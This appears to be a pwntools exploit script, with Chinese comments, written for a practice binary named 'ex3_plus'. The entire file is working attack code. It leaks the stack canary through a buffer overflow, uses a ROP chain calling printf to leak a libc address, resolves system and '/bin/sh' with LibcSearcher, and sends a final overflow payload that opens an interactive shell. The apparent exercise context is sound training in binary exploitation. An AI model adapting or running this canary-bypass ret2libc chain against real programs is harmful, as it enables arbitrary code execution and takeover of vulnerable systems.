from pwn import *
from LibcSearcher import LibcSearcher

p = process("./ex3_plus")

# 泄漏canary
payload = b"A" * 101
p.send(payload)
p.recvuntil(b"A" * 100)
canary = u32(p.recv(4)) - 0x41  # 获得canary

elf = ELF("./ex3_plus")
printf_plt = elf.plt["printf"]
printf_got = elf.got["printf"]
main = elf.symbols["main"]

# 泄漏Libc
payload = flat([b"A" * 100, canary, b"A" * 12, printf_plt, main, printf_got])
p.send(payload)

p.recvuntil(b"A" * 100)
printf_addr = u32(p.recv(4))

# system
libc = LibcSearcher("printf", printf_addr)
libcbase = printf_addr - libc.dump("printf")
sys_addr = libcbase + libc.dump("system")
binsh = libcbase + libc.dump("str_bin_sh")

p.send(b"A")
p.recvuntil(b"A")

payload = flat([b"A" * 100, canary, b"A" * 12, sys_addr, 0xdeadbeef, binsh])
p.send(payload)
p.recvuntil(b"A" * 100)
p.interactive()

